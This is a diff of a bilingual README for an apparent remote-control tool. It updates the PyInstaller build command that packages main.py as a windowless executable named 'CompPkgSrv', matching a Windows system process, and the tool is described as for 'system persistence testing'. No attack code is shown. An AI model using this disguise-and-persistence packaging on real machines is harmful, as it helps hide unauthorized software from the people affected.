@@ -21,7 +21,7 @@
 1. Установите Python и библиотеки: `pip install -r requirements.txt`
 2. Вставьте свой `TOKEN` и `MY_ID` в код `main.py`.
 3. Соберите проект в папку (рекомендуется для стабильности):
-   `pyinstaller --noconsole --onedir --name "CompPkgSrv" main.py`
+   `pyinstaller --noconsole --onedir --icon=NONE --collect-all moviepy --copy-metadata imageio --copy-metadata moviepy --copy-metadata imageio_ffmpeg --name="CompPkgSrv" main.py`
 
 ---
 
@@ -41,7 +41,7 @@ Created for educational purposes and system persistence testing.
 1. Install Python and requirements: `pip install -r requirements.txt`
 2. Insert your `TOKEN` and `MY_ID` into `main.py`.
 3. Build into a directory (recommended for stability):
-   `pyinstaller --noconsole --onedir --name "CompPkgSrv" main.py`
+   `pyinstaller --noconsole --onedir --icon=NONE --collect-all moviepy --copy-metadata imageio --copy-metadata moviepy --copy-metadata imageio_ffmpeg --name="CompPkgSrv" main.py`
 
 ---
 
